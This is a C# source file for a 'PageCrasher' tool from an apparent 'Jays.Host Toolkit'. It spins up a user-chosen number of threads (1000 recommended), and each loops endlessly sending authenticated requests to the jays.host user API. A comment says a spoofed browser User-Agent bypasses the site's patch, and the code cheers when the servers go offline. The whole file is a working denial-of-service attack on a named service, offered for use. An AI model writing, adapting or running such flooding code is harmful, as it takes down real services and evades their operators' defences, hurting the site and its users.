using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using Newtonsoft.Json;
using static Colorful.Console;

namespace Jays.Host_Toolkit.Tools.Crashers
{
    public class PageCrasher
    {
        private static string _token;
        private static int _requestsSent;
        
        public static void Start()
        {
            tryAgain:
            try
            {
                Title = "Jays.Host Toolkit | Made by Verity | Version 2.0, Build 01/24/22 | Current Tool: PageCrasher";
            
                Utils.LoadingSequence();
            
                WriteLine(" Token:", Color.DodgerBlue);
                Write(" --> ", Color.DarkSlateBlue); 
                _token = ReadLine();
                
                Console.WriteLine("");
                
                WriteLine(" Threads [1000 Recommended]:", Color.DodgerBlue);
                Write(" --> ", Color.DarkSlateBlue);
                var threads = ReadLine();
                
                Clear();
                
                Utils.LoadingSequence();
                
                var convertThreads = Convert.ToInt32(threads);
                for (var i = 0; i < convertThreads; i++)
                {
                    new Thread(Crasher).Start();
                }

                Console.ReadLine();
            }
            catch (FormatException)
            {
                Console.WriteLine("\n Error, please enter the NUMBER of threads, its an integer not a string.");
                Console.ReadKey();
                Console.Clear();
                goto tryAgain;
            }
        }

        private static async void Crasher()
        {
            var random = new Random();
            while (true)
            {
                try
                {
                    Title = "Jays.Host Toolkit | Made by Verity | Version 2.0, Build 01/24/22 | Current Tool: PageCrasher | Requests Sent: " + _requestsSent;
                    var pageEndpoint = WebRequest.Create($"https://jays.host/api/v1/user?page=" + random.Next(1, 17) + "&search=");
                    pageEndpoint.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.62"); // Bypass Jays awesome patch.
                    pageEndpoint.Headers.Add("authorization", _token);
                    pageEndpoint.Method = WebRequestMethods.Http.Get;
                    var responseMessage = (HttpWebResponse)await pageEndpoint.GetResponseAsync();
                    var streamReader = new StreamReader(responseMessage.GetResponseStream());
                    JsonConvert.DeserializeObject(await streamReader.ReadToEndAsync());
                    var contentString = responseMessage.StatusCode;
                    WriteLine(contentString == HttpStatusCode.OK ? " #" + _requestsSent + " Requests Sent." : " Request failed to send (Jays.Host is most likely down).", Color.Green);
                    _requestsSent += 1;
                }
                catch (WebException e)
                {
                    if (e.Status == WebExceptionStatus.UnknownError)
                    {
                        WriteLine(" Servers Offline :)", Color.Green);
                    }
                    else
                    {
                        WriteLine(" Servers unreachable :) -> " + e.Message, Color.Green);
                    }
                    _requestsSent += 1;
                }
                Thread.Sleep(100);
            }
        }
    }
}